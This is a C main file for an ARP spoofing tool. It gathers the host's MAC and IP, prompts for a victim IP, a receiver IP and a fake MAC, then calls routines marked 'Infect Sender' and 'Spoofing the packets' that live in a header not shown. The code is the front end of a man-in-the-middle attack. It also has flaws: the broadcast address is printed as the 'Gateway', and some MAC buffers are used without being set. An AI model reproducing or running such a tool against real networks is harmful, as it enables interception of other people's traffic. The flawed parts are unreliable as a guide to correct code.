//main.cpp

#include <stdio.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <netinet/ether.h>
#include <stdlib.h>
#include <pcap.h>
#include "arp_spoof.h"

int main()
{
	int fd;					//for socket
	struct ifreq ifr;
	struct in_addr addr;
	char buf[INET_ADDRSTRLEN];
	char victim_ip[INET_ADDRSTRLEN];
	char iface[] = "eth0";

	u_char *s_mac;
	u_char *d_mac;
	u_char *r_mac;
	u_char *f_mac;
	
	char tmp_mac[20];
	int tmp_val[ETHER_ADDR_LEN];

	struct in_addr s_ip;
	struct in_addr d_ip;
	struct in_addr r_ip;

	fd = socket(AF_INET, SOCK_DGRAM, 0);

	ifr.ifr_addr.sa_family = AF_INET;

	strncpy(ifr.ifr_name, iface, IFNAMSIZ-1);

	puts("IP address of the sender : ");
	
	while(1)
	{
		fgets(victim_ip, sizeof(victim_ip), stdin);
		victim_ip[strlen(victim_ip) - 1] = '\0';
	
		if(inet_pton(AF_INET, victim_ip, &d_ip.s_addr) == 0)
		{
			printf("Invalid IP address! \n");
			continue;
		}
		else
			break;
	}

	printf("\nMy Network Status: \n");
	printf("Device: %s\n", iface);
	
        ioctl(fd, SIOCGIFHWADDR, &ifr);
	
	s_mac = (u_char *)malloc(ETHER_ADDR_LEN);
	d_mac = (u_char *)malloc(ETHER_ADDR_LEN);
	r_mac = (u_char *)malloc(ETHER_ADDR_LEN);
	f_mac = (u_char *)malloc(ETHER_ADDR_LEN);

	memcpy(s_mac, (u_char *)ifr.ifr_hwaddr.sa_data, 6);
	
	//MAC address
	printf("MAC address: %02x:%02x:%02x:%02x:%02x:%02x\n",
		s_mac[0], s_mac[1], s_mac[2], s_mac[3], s_mac[4], s_mac[5]);
	
	//IP addrses
        ioctl(fd, SIOCGIFADDR, &ifr);
	s_ip = ((struct sockaddr_in *)&ifr.ifr_addr) -> sin_addr;
	printf("IP address: %s\n", inet_ntop(AF_INET, &s_ip, buf, sizeof(buf)));
	
	//Gateway
	ioctl(fd, SIOCGIFBRDADDR, &ifr);
	printf("Gateway: %s\n", inet_ntop(AF_INET, &(((struct sockaddr_in *)&ifr.ifr_broadaddr) -> sin_addr), buf, sizeof(buf)));

	puts("\nWrite Receiver IP address: ");
	
	while(1)
	{
		fgets(buf, sizeof(buf), stdin);
		buf[strlen(buf) -1 ] = '\0';

		if(inet_pton(AF_INET, buf, &r_ip.s_addr) == 0)
		{
			printf("Invalid IP address! \n");
			continue;
		}
		else
			break;
	}

	puts("\nWrite FAKE MAC address: ");
	
	while(1)
	{
		fgets(tmp_mac, sizeof(tmp_mac), stdin);
		tmp_mac[strlen(tmp_mac) - 1] = '\0';

		if(sscanf(tmp_mac, "%x:%x:%x:%x:%x:%x", 
			&tmp_val[0], &tmp_val[1], &tmp_val[2],
			&tmp_val[3], &tmp_val[4], &tmp_val[5]) == ETHER_ADDR_LEN)
		{
			for (int i = 0; i < 6; i++)
				f_mac[i] = (uint8_t) tmp_val[i];
			break;
		}
		else
		{
			printf("Invalid MAC address! (00:00:00:00:00:00) \n");
		}
	}

	arp_main(s_mac, d_mac, r_mac, f_mac, s_ip, d_ip, r_ip);		//Infect Sender
	//arp_main(s_mac, d_mac, r_mac, f_mac, s_ip, r_ip, handle, 2);	//Infect Receiver

	printf("Spoofing the packets....\n");
	
	packet_spoof(s_mac, f_mac, d_mac, r_mac, s_ip, d_ip, r_ip);
	
	close(fd);
	free(s_mac);
	free(d_mac);
	free(r_mac);
	free(f_mac);
	return 0;
}
